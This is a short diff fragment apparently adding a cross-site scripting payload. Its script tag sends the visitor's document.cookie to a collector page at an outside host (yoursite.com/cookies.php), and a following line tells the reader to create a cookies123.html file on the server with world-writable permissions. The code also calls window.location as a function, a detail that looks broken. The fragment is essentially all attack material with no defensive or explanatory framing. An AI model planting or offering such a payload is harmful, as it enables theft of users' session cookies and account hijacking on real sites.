@@ -1,0 +1,3 @@
+<script>window.location('http://www.yoursite.com/cookies.php?c=' + document.cookie)</script>
+
+create cookies123.html on server and chmod 777
